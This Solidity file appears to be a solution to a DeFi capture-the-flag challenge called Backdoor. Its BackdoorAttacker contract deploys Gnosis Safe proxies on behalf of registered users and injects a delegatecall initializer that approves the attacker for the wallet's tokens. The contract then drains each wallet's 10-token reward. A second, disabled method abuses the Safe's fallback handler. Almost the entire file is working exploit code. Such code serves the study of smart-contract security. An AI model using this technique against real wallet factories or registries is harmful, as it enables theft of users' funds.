// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "./WalletRegistry.sol";

import "hardhat/console.sol";

contract BackdoorDelegate {
    function approve(address token, address spender) external {
        IERC20(token).approve(spender, type(uint256).max);
    }

    function transfer(address _token, address from, address to) external {
        IERC20 token = IERC20(_token);
        require(
            token.allowance(from, address(this)) >= token.balanceOf(from),
            "Not enough allowance"
        );
        token.transferFrom(from, to, token.balanceOf(from));
    }
}

contract BackdoorAttacker {
    uint256 private constant EXPECTED_OWNERS_COUNT = 1;
    uint256 private constant EXPECTED_THRESHOLD = 1;
    uint256 private constant PAYMENT_AMOUNT = 10 ether;

    WalletRegistry public registry;
    GnosisSafeProxyFactory public walletFactory;
    address public masterCopy;
    IERC20 public token;

    BackdoorDelegate private delegate;

    constructor(address[] memory users, address _registry) {
        registry = WalletRegistry(_registry);
        walletFactory = GnosisSafeProxyFactory(registry.walletFactory());
        masterCopy = registry.masterCopy();
        token = registry.token();
        delegate = new BackdoorDelegate();

        for (uint256 i; i < users.length; ) {
            attackViaDelegateCall(users[i], i);
            unchecked {
                ++i;
            }
        }
    }

    function attackViaDelegateCall(address user, uint256 nonce) internal {
        address[] memory owners = new address[](EXPECTED_OWNERS_COUNT);
        owners[0] = user;

        // Token balance is not available when initializer is called.
        bytes memory initializer = abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            owners,
            EXPECTED_THRESHOLD,
            address(delegate),
            abi.encodeWithSignature(
                "approve(address,address)",
                token,
                address(this)
                // address(delegate)
            ),
            address(0), // fallbackHandler is prohibited
            address(0),
            0,
            address(0)
        );
        GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(
            masterCopy,
            initializer,
            nonce,
            registry
        );
        console.log("Proxy created at: %s", address(proxy));

        bool success = IERC20(token).transferFrom(
            address(proxy),
            msg.sender,
            PAYMENT_AMOUNT
        );
        require(success, "Transfer failed");
        // delegate.transfer(address(proxy), msg.sender);
    }

    // This attack vector is no longer working as the registry contract
    // now prohibits non-zero fallback manager/handler.
    function attackViaFallback(address user, uint256 nonce) internal {
        address[] memory owners = new address[](EXPECTED_OWNERS_COUNT);
        owners[0] = user;
        bytes memory initializer = abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            owners,
            EXPECTED_THRESHOLD,
            address(0),
            "",
            address(token), // fallbackHandler
            address(0),
            0,
            address(0)
        );
        GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(
            masterCopy,
            initializer,
            nonce,
            registry
        );
        // The proxy's fallback forwards this call to its _singleton,
        // which is an instance of GnosisSafe. The fallback function
        // of then GnosisSafe contract then call the registered fallback
        // handler, which is the token, with proxy/wallet as msg.sender.
        (bool success, ) = address(proxy).call(
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                msg.sender,
                PAYMENT_AMOUNT
            )
        );
        require(success, "Transfer via fallback failed");
    }
}
